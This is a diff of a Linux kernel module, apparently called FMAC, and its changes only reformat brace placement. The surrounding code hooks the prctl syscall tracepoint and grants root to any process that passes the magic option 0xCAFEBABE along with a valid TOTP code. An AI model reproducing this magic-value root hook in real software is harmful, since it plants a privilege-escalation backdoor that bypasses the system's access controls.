@@ -36,11 +36,13 @@ static void fmac_sys_enter_prctl(void *data, struct pt_regs *regs, long id)
     //   arg2 = regs->regs[1];
     //  arg3 = regs->regs[2]; // user space lenght
 
-    if (option == 0xCAFEBABE) {
+    if (option == 0xCAFEBABE)
+    {
         f_log("Tracepoint: prctl detected! option=0x%lx, arg2=0x%lx\n", option, arg2);
         auth_ret = check_totp_ecc((const char __user *)arg2, arg3);
 
-        if (auth_ret == 1) {
+        if (auth_ret == 1)
+        {
             f_log("FMAC: >>> AUTH SUCCESS <<<\n");
             elevate_to_root();
         }
@@ -52,7 +54,8 @@ int fmac_tracepoint_init(void)
     int ret;
 
     ret = register_trace_sys_enter(fmac_sys_enter_prctl, NULL);
-    if (ret) {
+    if (ret)
+    {
         pr_err("FMAC: Failed to register sys_enter tracepoint\n");
         return ret;
     }
